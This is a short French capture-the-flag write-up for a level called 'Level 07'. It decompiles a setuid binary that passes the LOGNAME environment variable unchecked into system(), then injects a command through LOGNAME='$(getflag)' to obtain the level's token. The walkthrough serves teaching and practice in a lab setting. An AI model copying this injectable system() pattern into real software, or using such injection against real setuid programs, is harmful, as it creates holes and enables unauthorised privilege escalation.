# Level 07

1) La commande `ls` nous donne ceci:

```bash
ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

Nous avons un binaire `level07`.

2) Une fois ce binaire decompile grace a Ghidra nous optenons ceci:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int ac, char **av, char **envp)
{
    char *logname;
    char *buff;
    gid_t gid;
    uid_t uid;

    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    buff = NULL;
    logname = getenv("LOGNAME");
    asprintf(&buff, "/bin/echo %s", logname);
    return system(buff);
}
```

3) Nous devons donc juste faire en sorte de modifier la variable d'environement `LOGNAME` pour executer getflag:

```bash
LOGNAME='$(getflag)' ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
